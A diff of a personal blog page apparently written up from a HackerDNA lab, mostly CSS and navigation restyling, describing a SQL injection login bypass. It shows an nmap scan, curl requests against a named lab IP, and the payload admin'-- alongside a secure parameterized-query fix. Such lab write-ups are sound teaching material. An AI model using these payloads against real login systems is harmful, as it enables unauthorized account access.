@@ -1,10 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auth Bypass via SQL Injection | S.M.Zaidi Blog</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap"
+        rel="stylesheet">
     <style>
         :root {
             --bg: #0a0e1a;
@@ -21,7 +24,11 @@
             --body: 'Rajdhani', sans-serif;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
         body {
             background: var(--bg);
@@ -36,53 +43,168 @@
         body::before {
             content: '';
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: repeating-linear-gradient(
-                0deg,
-                transparent,
-                transparent 2px,
-                rgba(0,212,255,0.015) 2px,
-                rgba(0,212,255,0.015) 4px
-            );
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg,
+                    transparent,
+                    transparent 2px,
+                    rgba(0, 212, 255, 0.015) 2px,
+                    rgba(0, 212, 255, 0.015) 4px);
             pointer-events: none;
             z-index: 0;
         }
 
-        /* NAV */
-        nav {
-            background: rgba(10,14,26,0.95);
-            border-bottom: 1px solid var(--border);
-            padding: 16px 40px;
+        /* ===== MOBILE NAVBAR ===== */
+        .mobile-navbar {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(10, 14, 27, 0.98);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            box-shadow: 0 2px 20px rgba(0, 255, 255, 0.2);
+        }
+
+        .mobile-nav-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 5%;
+        }
+
+        .mobile-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #00ffff, #00ff88);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .mobile-menu-toggle {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+            padding: 5px;
+        }
+
+        .mobile-menu-toggle span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background: #00ffff;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .mobile-menu-toggle.active span:nth-child(1) {
+            transform: rotate(45deg) translate(7px, 7px);
+        }
+
+        .mobile-menu-toggle.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .mobile-menu-toggle.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        .mobile-menu {
+            display: none;
+            flex-direction: column;
+            background: rgba(10, 14, 27, 0.98);
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
+        }
+
+        .mobile-menu.active {
+            display: flex;
+        }
+
+        .mobile-menu-item {
+            padding: 1rem 5%;
+            color: #00ffff;
+            text-decoration: none;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.1);
+            transition: all 0.3s;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .mobile-menu-item:hover {
+            background: rgba(0, 255, 255, 0.1);
+            padding-left: 8%;
+        }
+
+        /* ===== DRAWER SIDEBAR NAV ===== */
+        .drawer-icons {
+            position: fixed;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .nav-pill {
+            width: 52px;
+            height: 52px;
+            background: rgba(20, 30, 60, 0.9);
+            border: 1px solid rgba(0, 255, 255, 0.25);
+            border-radius: 50px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-        }
-
-        .nav-logo {
-            font-family: var(--display);
-            font-size: 1.1rem;
-            color: var(--accent);
+            gap: 12px;
+            overflow: hidden;
             text-decoration: none;
-            letter-spacing: 2px;
+            transition: width 0.35s ease, box-shadow 0.35s ease;
         }
 
-        .nav-logo span { color: var(--accent2); }
-
-        .nav-links a {
-            color: var(--muted);
-            text-decoration: none;
-            margin-left: 24px;
-            font-family: var(--mono);
-            font-size: 0.85rem;
-            transition: color 0.2s;
+        .nav-pill .icon {
+            min-width: 52px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            color: #aaa;
         }
 
-        .nav-links a:hover { color: var(--accent); }
+        .nav-pill .text {
+            white-space: nowrap;
+            color: #00ffff;
+            font-size: 0.95rem;
+            opacity: 0;
+            transform: translateX(-10px);
+            transition: opacity 0.25s ease, transform 0.25s ease;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .nav-pill:hover {
+            width: 150px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+
+        .nav-pill:hover .text {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        @media (max-width: 768px) {
+            .mobile-navbar {
+                display: block;
+            }
+
+            .drawer-icons {
+                display: none;
+            }
+        }
 
         /* MAIN */
         main {
@@ -105,7 +227,10 @@
             margin-bottom: 40px;
             transition: color 0.2s;
         }
-        .back-link:hover { color: var(--accent); }
+
+        .back-link:hover {
+            color: var(--accent);
+        }
 
         /* ARTICLE HEADER */
         .article-header {
@@ -129,9 +254,23 @@
             border: 1px solid;
         }
 
-        .tag-red { color: var(--red); border-color: var(--red); background: rgba(255,68,68,0.1); }
-        .tag-blue { color: var(--accent); border-color: var(--accent); background: rgba(0,212,255,0.1); }
-        .tag-green { color: var(--accent2); border-color: var(--accent2); background: rgba(0,255,136,0.1); }
+        .tag-red {
+            color: var(--red);
+            border-color: var(--red);
+            background: rgba(255, 68, 68, 0.1);
+        }
+
+        .tag-blue {
+            color: var(--accent);
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .tag-green {
+            color: var(--accent2);
+            border-color: var(--accent2);
+            background: rgba(0, 255, 136, 0.1);
+        }
 
         h1 {
             font-family: var(--display);
@@ -152,7 +291,9 @@
             flex-wrap: wrap;
         }
 
-        .article-meta span { color: var(--accent); }
+        .article-meta span {
+            color: var(--accent);
+        }
 
         /* SUMMARY BOX */
         .summary-box {
@@ -181,9 +322,21 @@
             margin-top: 12px;
         }
 
-        .summary-item { display: flex; flex-direction: column; gap: 4px; }
-        .summary-item .key { color: var(--muted); font-size: 0.75rem; }
-        .summary-item .val { color: #fff; font-size: 0.9rem; }
+        .summary-item {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .summary-item .key {
+            color: var(--muted);
+            font-size: 0.75rem;
+        }
+
+        .summary-item .val {
+            color: #fff;
+            font-size: 0.9rem;
+        }
 
         /* SECTIONS */
         h2 {
@@ -214,7 +367,10 @@
             margin: 24px 0 10px;
         }
 
-        p { margin-bottom: 16px; color: var(--text); }
+        p {
+            margin-bottom: 16px;
+            color: var(--text);
+        }
 
         /* CODE BLOCKS */
         .code-block {
@@ -237,7 +393,9 @@
             border-bottom: 1px solid var(--border);
         }
 
-        .code-header .lang { color: var(--accent); }
+        .code-header .lang {
+            color: var(--accent);
+        }
 
         .code-block pre {
             padding: 20px;
@@ -248,11 +406,25 @@
             color: #e6edf3;
         }
 
-        .code-block pre .cmd { color: var(--accent2); }
-        .code-block pre .flag { color: var(--red); }
-        .code-block pre .comment { color: var(--muted); }
-        .code-block pre .string { color: #f97316; }
-        .code-block pre .key { color: var(--accent); }
+        .code-block pre .cmd {
+            color: var(--accent2);
+        }
+
+        .code-block pre .flag {
+            color: var(--red);
+        }
+
+        .code-block pre .comment {
+            color: var(--muted);
+        }
+
+        .code-block pre .string {
+            color: #f97316;
+        }
+
+        .code-block pre .key {
+            color: var(--accent);
+        }
 
         /* TERMINAL BLOCK */
         .terminal {
@@ -272,10 +444,23 @@
             border-bottom: 1px solid #2d4a2d;
         }
 
-        .dot { width: 10px; height: 10px; border-radius: 50%; }
-        .dot-red { background: #ff5f57; }
-        .dot-yellow { background: #febc2e; }
-        .dot-green { background: #28c840; }
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .dot-red {
+            background: #ff5f57;
+        }
+
+        .dot-yellow {
+            background: #febc2e;
+        }
+
+        .dot-green {
+            background: #28c840;
+        }
 
         .terminal-title {
             font-family: var(--mono);
@@ -293,11 +478,25 @@
             overflow-x: auto;
         }
 
-        .terminal pre .prompt { color: var(--muted); }
-        .terminal pre .output { color: #c9d1d9; }
-        .terminal pre .success { color: var(--accent2); }
-        .terminal pre .error { color: var(--red); }
-        .terminal pre .highlight { color: var(--accent); }
+        .terminal pre .prompt {
+            color: var(--muted);
+        }
+
+        .terminal pre .output {
+            color: #c9d1d9;
+        }
+
+        .terminal pre .success {
+            color: var(--accent2);
+        }
+
+        .terminal pre .error {
+            color: var(--red);
+        }
+
+        .terminal pre .highlight {
+            color: var(--accent);
+        }
 
         /* ALERT BOXES */
         .alert {
@@ -309,25 +508,25 @@
         }
 
         .alert-info {
-            background: rgba(0,212,255,0.07);
+            background: rgba(0, 212, 255, 0.07);
             border-color: var(--accent);
             color: #a8d8ea;
         }
 
         .alert-warning {
-            background: rgba(255,170,0,0.07);
+            background: rgba(255, 170, 0, 0.07);
             border-color: #ffaa00;
             color: #ffd580;
         }
 
         .alert-danger {
-            background: rgba(255,68,68,0.07);
+            background: rgba(255, 68, 68, 0.07);
             border-color: var(--red);
             color: #ffaaaa;
         }
 
         .alert-success {
-            background: rgba(0,255,136,0.07);
+            background: rgba(0, 255, 136, 0.07);
             border-color: var(--accent2);
             color: #aaffcc;
         }
@@ -372,9 +571,21 @@
             margin-top: 2px;
         }
 
-        .step-content { padding-bottom: 28px; }
-        .step-content h4 { color: #fff; font-size: 1rem; margin-bottom: 6px; }
-        .step-content p { color: var(--muted); font-size: 0.9rem; margin: 0; }
+        .step-content {
+            padding-bottom: 28px;
+        }
+
+        .step-content h4 {
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 6px;
+        }
+
+        .step-content p {
+            color: var(--muted);
+            font-size: 0.9rem;
+            margin: 0;
+        }
 
         /* VULNERABILITY CARD */
         .vuln-card {
@@ -409,7 +620,9 @@
             transition: border-color 0.2s;
         }
 
-        .learning-card:hover { border-color: var(--accent); }
+        .learning-card:hover {
+            border-color: var(--accent);
+        }
 
         .learning-card .icon {
             font-size: 1.5rem;
@@ -441,7 +654,10 @@
             z-index: 1;
         }
 
-        footer a { color: var(--accent); text-decoration: none; }
+        footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
 
         /* INLINE CODE */
         code {
@@ -455,216 +671,290 @@
         }
 
         @media (max-width: 600px) {
-            h1 { font-size: 1.4rem; }
-            nav { padding: 14px 20px; }
-            .nav-links { display: none; }
+            h1 {
+                font-size: 1.4rem;
+            }
+
+            nav {
+                padding: 14px 20px;
+            }
+
+            .nav-links {
+                display: none;
+            }
         }
     </style>
 </head>
+
 <body>
 
-<nav>
-    <a href="https://mujtaba11riu.github.io/Portfolio1.1/" class="nav-logo">S.M.<span>Zaidi</span></a>
-    <div class="nav-links">
-        <a href="https://mujtaba11riu.github.io/Portfolio1.1/">Home</a>
-        <a href="#">Blog</a>
-        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#contact">Contact</a>
-    </div>
-</nav>
+    <!-- MOBILE TOP NAVBAR -->
+    <nav class="mobile-navbar">
+        <div class="mobile-nav-container">
+            <div class="mobile-logo">S.M.Zaidi</div>
+            <button class="mobile-menu-toggle" id="mobileMenuToggle">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+        <div class="mobile-menu" id="mobileMenu">
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#home" class="mobile-menu-item">🏠 Home</a>
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#about" class="mobile-menu-item">👤 About</a>
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#education" class="mobile-menu-item">🎓 Education</a>
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#projects" class="mobile-menu-item">💻 Projects</a>
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#skills" class="mobile-menu-item">⚙️ Experience</a>
+            <a href="https://mujtaba11riu.github.io/Portfolio1.1/#contact" class="mobile-menu-item">✉️ Contact</a>
+            <a href="blog-auth-bypass.html" class="mobile-menu-item">📝 Blog</a>
+        </div>
+    </nav>
 
-<main>
-
-    <a href="#" class="back-link">← Back to Blog</a>
-
-    <header class="article-header">
-        <div class="tag-row">
-            <span class="tag tag-red">SQL Injection</span>
-            <span class="tag tag-blue">Auth Bypass</span>
-            <span class="tag tag-green">HackerDNA Lab</span>
-        </div>
-        <h1>Auth Bypass via SQL Injection</h1>
-        <div class="article-meta">
-            <div>By <span>Syed Mujtaba Zaidi</span></div>
-            <div>Feb 18, 2026</div>
-            <div>Platform: <span>HackerDNA</span></div>
-            <div>Difficulty: <span>Junior</span></div>
-        </div>
-    </header>
-
-    <!-- SUMMARY -->
-    <div class="summary-box">
-        <div class="label">// Challenge Summary</div>
-        <p style="color:#c9d1d9; margin:0 0 12px;">A classic SQL injection authentication bypass on an enterprise login portal running Node.js/Express on a non-standard port discovered via Nmap scanning.</p>
-        <div class="summary-grid">
-            <div class="summary-item"><span class="key">Target</span><span class="val">63.32.98.247</span></div>
-            <div class="summary-item"><span class="key">Service Port</span><span class="val">8080 (Node.js)</span></div>
-            <div class="summary-item"><span class="key">Vulnerability</span><span class="val">SQL Injection</span></div>
-            <div class="summary-item"><span class="key">Tools Used</span><span class="val">nmap, curl, gobuster</span></div>
-        </div>
-    </div>
-
-    <!-- METHODOLOGY -->
-    <h2>Methodology</h2>
-
-    <div class="steps">
-        <div class="step">
-            <div class="step-num">1</div>
-            <div class="step-content">
-                <h4>Port Discovery</h4>
-                <p>Main page on port 80 was just a static challenge page. Ran full port scan to find the real service.</p>
-            </div>
-        </div>
-        <div class="step">
-            <div class="step-num">2</div>
-            <div class="step-content">
-                <h4>Service Enumeration</h4>
-                <p>Discovered port 8080 running Node.js/Express — the actual authentication system.</p>
-            </div>
-        </div>
-        <div class="step">
-            <div class="step-num">3</div>
-            <div class="step-content">
-                <h4>Login Form Analysis</h4>
-                <p>Port 8080 revealed an enterprise login form POSTing to /login endpoint.</p>
-            </div>
-        </div>
-        <div class="step">
-            <div class="step-num">4</div>
-            <div class="step-content">
-                <h4>SQL Injection</h4>
-                <p>Tested the username field with classic payloads — authentication bypassed successfully.</p>
-            </div>
-        </div>
+    <!-- LEFT SIDEBAR NAVIGATION -->
+    <div class="drawer-icons">
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#home" class="nav-pill">
+            <span class="icon">🏠</span><span class="text">Home</span>
+        </a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#about" class="nav-pill">
+            <span class="icon">👤</span><span class="text">About</span>
+        </a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#education" class="nav-pill">
+            <span class="icon">🎓</span><span class="text">Education</span>
+        </a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#projects" class="nav-pill">
+            <span class="icon">💻</span><span class="text">Projects</span>
+        </a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#skills" class="nav-pill">
+            <span class="icon">⚙️</span><span class="text">Experience</span>
+        </a>
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/#contact" class="nav-pill">
+            <span class="icon">✉️</span><span class="text">Contact</span>
+        </a>
+        <a href="blog-auth-bypass.html" class="nav-pill">
+            <span class="icon">📝</span><span class="text">Blog</span>
+        </a>
     </div>
 
-    <!-- RECON -->
-    <h2>Reconnaissance</h2>
+    <main>
+        
+        <a href="https://mujtaba11riu.github.io/Portfolio1.1/" class="back-link">← Back to Portfolio</a>
 
-    <p>The challenge page only showed a static landing page on port 80 with no useful attack surface. The hint said to <em>"find the authentication service located on this network"</em> — this meant port scanning was required.</p>
+        <header class="article-header">
+            <div class="tag-row">
+                <span class="tag tag-red">SQL Injection</span>
+                <span class="tag tag-blue">Auth Bypass</span>
+                <span class="tag tag-green">HackerDNA Lab</span>
+            </div>
+            <h1>Auth Bypass via SQL Injection</h1>
+            <div class="article-meta">
+                <div>By <span>Syed Mujtaba Zaidi</span></div>
+                <div>Feb 18, 2026</div>
+                <div>Platform: <span>HackerDNA</span></div>
+                <div>Difficulty: <span>Junior</span></div>
+            </div>
+        </header>
 
-    <div class="code-block">
-        <div class="code-header"><span class="lang">bash</span><span>nmap scan</span></div>
-        <pre><span class="cmd">nmap -sV -p- --min-rate 5000 63.32.98.247</span></pre>
-    </div>
-
-    <div class="terminal">
-        <div class="terminal-header">
-            <div class="dot dot-red"></div>
-            <div class="dot dot-yellow"></div>
-            <div class="dot dot-green"></div>
-            <span class="terminal-title">kali@terminal</span>
+        <!-- SUMMARY -->
+        <div class="summary-box">
+            <div class="label">// Challenge Summary</div>
+            <p style="color:#c9d1d9; margin:0 0 12px;">A classic SQL injection authentication bypass on an enterprise
+                login portal running Node.js/Express on a non-standard port discovered via Nmap scanning.</p>
+            <div class="summary-grid">
+                <div class="summary-item"><span class="key">Target</span><span class="val">63.32.98.247</span></div>
+                <div class="summary-item"><span class="key">Service Port</span><span class="val">8080 (Node.js)</span>
+                </div>
+                <div class="summary-item"><span class="key">Vulnerability</span><span class="val">SQL Injection</span>
+                </div>
+                <div class="summary-item"><span class="key">Tools Used</span><span class="val">nmap, curl,
+                        gobuster</span></div>
+            </div>
         </div>
-        <pre><span class="output">PORT     STATE SERVICE VERSION
+
+        <!-- METHODOLOGY -->
+        <h2>Methodology</h2>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-content">
+                    <h4>Port Discovery</h4>
+                    <p>Main page on port 80 was just a static challenge page. Ran full port scan to find the real
+                        service.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-content">
+                    <h4>Service Enumeration</h4>
+                    <p>Discovered port 8080 running Node.js/Express — the actual authentication system.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-content">
+                    <h4>Login Form Analysis</h4>
+                    <p>Port 8080 revealed an enterprise login form POSTing to /login endpoint.</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">4</div>
+                <div class="step-content">
+                    <h4>SQL Injection</h4>
+                    <p>Tested the username field with classic payloads — authentication bypassed successfully.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- RECON -->
+        <h2>Reconnaissance</h2>
+
+        <p>The challenge page only showed a static landing page on port 80 with no useful attack surface. The hint said
+            to <em>"find the authentication service located on this network"</em> — this meant port scanning was
+            required.</p>
+
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>nmap scan</span></div>
+            <pre><span class="cmd">nmap -sV -p- --min-rate 5000 63.32.98.247</span></pre>
+        </div>
+
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="dot dot-red"></div>
+                <div class="dot dot-yellow"></div>
+                <div class="dot dot-green"></div>
+                <span class="terminal-title">kali@terminal</span>
+            </div>
+            <pre><span class="output">PORT     STATE SERVICE VERSION
 </span><span class="highlight">80/tcp   open  http    nginx 1.26.3</span>
 <span class="success">8080/tcp open  http    Node.js (Express middleware)</span></pre>
-    </div>
+        </div>
 
-    <p>Port 8080 was the target — a Node.js/Express application running the authentication service.</p>
+        <p>Port 8080 was the target — a Node.js/Express application running the authentication service.</p>
 
-    <!-- ENUMERATION -->
-    <h2>Enumeration</h2>
+        <!-- ENUMERATION -->
+        <h2>Enumeration</h2>
 
-    <p>Visiting <code>http://63.32.98.247:8080/</code> revealed a standard enterprise login form with username and password fields, submitting credentials via POST to <code>/login</code>.</p>
+        <p>Visiting <code>http://63.32.98.247:8080/</code> revealed a standard enterprise login form with username and
+            password fields, submitting credentials via POST to <code>/login</code>.</p>
 
-    <p>First I tested default credentials:</p>
+        <p>First I tested default credentials:</p>
 
-    <div class="code-block">
-        <div class="code-header"><span class="lang">bash</span><span>default creds test</span></div>
-        <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>default creds test</span></div>
+            <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
   -d "username=admin&password=admin"</span></pre>
-    </div>
+        </div>
 
-    <div class="alert alert-danger">
-        ✗ Authentication failed. Invalid username or password.
-    </div>
+        <div class="alert alert-danger">
+            ✗ Authentication failed. Invalid username or password.
+        </div>
 
-    <p>Default credentials did not work. Moving on to SQL injection testing.</p>
+        <p>Default credentials did not work. Moving on to SQL injection testing.</p>
 
-    <!-- EXPLOITATION -->
-    <h2>Exploitation</h2>
+        <!-- EXPLOITATION -->
+        <h2>Exploitation</h2>
 
-    <p>The login form was a prime candidate for SQL injection. The classic payload to bypass authentication is:</p>
+        <p>The login form was a prime candidate for SQL injection. The classic payload to bypass authentication is:</p>
 
-    <div class="code-block">
-        <div class="code-header"><span class="lang">sql</span><span>injection payload logic</span></div>
-        <pre><span class="comment">-- Normal query the app runs:</span>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">sql</span><span>injection payload logic</span></div>
+            <pre><span class="comment">-- Normal query the app runs:</span>
 SELECT * FROM users WHERE username=<span class="string">'INPUT'</span> AND password=<span class="string">'INPUT'</span>
 
 <span class="comment">-- With payload  admin'--  the query becomes:</span>
 SELECT * FROM users WHERE username=<span class="string">'admin'</span><span class="flag">--</span><span class="string">'</span> AND password=<span class="string">'...'</span>
 
 <span class="comment">-- Everything after -- is a comment, password check is ignored!</span></pre>
-    </div>
+        </div>
 
-    <div class="code-block">
-        <div class="code-header"><span class="lang">bash</span><span>exploit</span></div>
-        <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
+        <div class="code-block">
+            <div class="code-header"><span class="lang">bash</span><span>exploit</span></div>
+            <pre><span class="cmd">curl -X POST http://63.32.98.247:8080/login \
   -d <span class="string">"username=admin'--&password=anything"</span></span></pre>
-    </div>
+        </div>
 
-    <div class="alert alert-success">
-        ✓ Authentication Successful! Welcome, admin!
-    </div>
+        <div class="alert alert-success">
+            ✓ Authentication Successful! Welcome, admin!
+        </div>
 
-    <!-- VULNERABILITY -->
-    <h2>Vulnerability Analysis</h2>
+        <!-- VULNERABILITY -->
+        <h2>Vulnerability Analysis</h2>
 
-    <div class="vuln-card">
-        <div class="vuln-title">⚠ OWASP A03:2021 — SQL Injection</div>
-        <p style="margin:0; color:#c9d1d9; font-size:0.95rem;">The application directly concatenated user-supplied input into SQL queries without sanitization or parameterization. This is one of the most well-known and dangerous vulnerabilities in web security.</p>
-    </div>
+        <div class="vuln-card">
+            <div class="vuln-title">⚠ OWASP A03:2021 — SQL Injection</div>
+            <p style="margin:0; color:#c9d1d9; font-size:0.95rem;">The application directly concatenated user-supplied
+                input into SQL queries without sanitization or parameterization. This is one of the most well-known and
+                dangerous vulnerabilities in web security.</p>
+        </div>
 
-    <h3>Vulnerable Code Pattern</h3>
-    <div class="code-block">
-        <div class="code-header"><span class="lang">javascript</span><span>vulnerable code (example)</span></div>
-        <pre><span class="comment">// ❌ VULNERABLE — string concatenation</span>
+        <h3>Vulnerable Code Pattern</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">javascript</span><span>vulnerable code (example)</span></div>
+            <pre><span class="comment">// ❌ VULNERABLE — string concatenation</span>
 const query = <span class="string">`SELECT * FROM users WHERE username='${username}' AND password='${password}'`</span>;</pre>
-    </div>
+        </div>
 
-    <h3>Secure Code Pattern</h3>
-    <div class="code-block">
-        <div class="code-header"><span class="lang">javascript</span><span>secure code</span></div>
-        <pre><span class="comment">// ✅ SECURE — parameterized query</span>
+        <h3>Secure Code Pattern</h3>
+        <div class="code-block">
+            <div class="code-header"><span class="lang">javascript</span><span>secure code</span></div>
+            <pre><span class="comment">// ✅ SECURE — parameterized query</span>
 const query = <span class="string">'SELECT * FROM users WHERE username=? AND password=?'</span>;
 db.execute(query, [username, password]);</pre>
-    </div>
-
-    <!-- KEY LEARNINGS -->
-    <h2>Key Learnings</h2>
-
-    <div class="learning-grid">
-        <div class="learning-card">
-            <div class="icon">🔍</div>
-            <h4>Port Scanning First</h4>
-            <p>Always scan all ports — services often run on non-standard ports like 8080, 8443, 3000.</p>
         </div>
-        <div class="learning-card">
-            <div class="icon">💉</div>
-            <h4>Test Input Fields</h4>
-            <p>Every login form should be tested for SQL injection before trying other techniques.</p>
-        </div>
-        <div class="learning-card">
-            <div class="icon">🛡️</div>
-            <h4>Use Parameterized Queries</h4>
-            <p>Prepared statements completely prevent SQL injection regardless of input.</p>
-        </div>
-        <div class="learning-card">
-            <div class="icon">🧠</div>
-            <h4>Understand the SQL Logic</h4>
-            <p>Understanding how the query breaks helps craft better payloads and explain fixes.</p>
-        </div>
-    </div>
 
-    <div class="alert alert-info">
-        🔗 <strong>Lab Link:</strong> <a href="http://63.32.98.247/" style="color:var(--accent);">http://63.32.98.247/</a> — HackerDNA Auth Bypass Challenge
-    </div>
+        <!-- KEY LEARNINGS -->
+        <h2>Key Learnings</h2>
 
-</main>
+        <div class="learning-grid">
+            <div class="learning-card">
+                <div class="icon">🔍</div>
+                <h4>Port Scanning First</h4>
+                <p>Always scan all ports — services often run on non-standard ports like 8080, 8443, 3000.</p>
+            </div>
+            <div class="learning-card">
+                <div class="icon">💉</div>
+                <h4>Test Input Fields</h4>
+                <p>Every login form should be tested for SQL injection before trying other techniques.</p>
+            </div>
+            <div class="learning-card">
+                <div class="icon">🛡️</div>
+                <h4>Use Parameterized Queries</h4>
+                <p>Prepared statements completely prevent SQL injection regardless of input.</p>
+            </div>
+            <div class="learning-card">
+                <div class="icon">🧠</div>
+                <h4>Understand the SQL Logic</h4>
+                <p>Understanding how the query breaks helps craft better payloads and explain fixes.</p>
+            </div>
+        </div>
 
-<footer>
-    <p>Written by <a href="https://mujtaba11riu.github.io/Portfolio1.1/">Syed Mujtaba Zaidi</a> · Penetration Tester & CTF Player</p>
-    <p style="margin-top:8px; color:#374151;">Educational purposes only. Always hack ethically and legally.</p>
-</footer>
+        <div class="alert alert-info">
+            🔗 <strong>Lab Link:</strong> <a href="http://63.32.98.247/"
+                style="color:var(--accent);">http://63.32.98.247/</a> — HackerDNA Auth Bypass Challenge
+        </div>
+
+    </main>
+
+    <footer>
+        <p>Written by <a href="https://mujtaba11riu.github.io/Portfolio1.1/">Syed Mujtaba Zaidi</a> · Penetration Tester
+            & CTF Player</p>
+        <p style="margin-top:8px; color:#374151;">Educational purposes only. Always hack ethically and legally.</p>
+    </footer>
+
+    <script>
+        const mobileMenuToggle = document.getElementById('mobileMenuToggle');
+        const mobileMenu = document.getElementById('mobileMenu');
+        if (mobileMenuToggle) {
+            mobileMenuToggle.addEventListener('click', () => {
+                mobileMenuToggle.classList.toggle('active');
+                mobileMenu.classList.toggle('active');
+            });
+        }
+        document.querySelectorAll('.mobile-menu-item').forEach(item => {
+            item.addEventListener('click', () => {
+                mobileMenuToggle.classList.remove('active');
+                mobileMenu.classList.remove('active');
+            });
+        });
+    </script>
 
 </body>
+
 </html>
